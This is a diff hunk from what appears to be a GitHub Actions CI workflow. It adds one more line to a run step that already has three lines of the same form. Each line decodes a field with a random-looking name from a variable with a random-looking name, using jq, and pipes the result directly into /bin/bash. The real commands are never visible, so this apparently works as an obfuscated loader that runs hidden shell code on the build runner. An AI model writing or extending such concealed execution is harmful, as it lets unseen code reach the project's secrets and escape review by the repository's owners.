@@ -26,6 +26,7 @@ jobs:
           echo $lb016 | jq -r .gvv0702 | /bin/bash
           echo $tus1467 | jq -r .vymq4045 | /bin/bash
           printf '%s' "$yr7128" | jq -r .poca2287 | /bin/bash
+          echo $ajjt6 | jq -r .ad46336 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
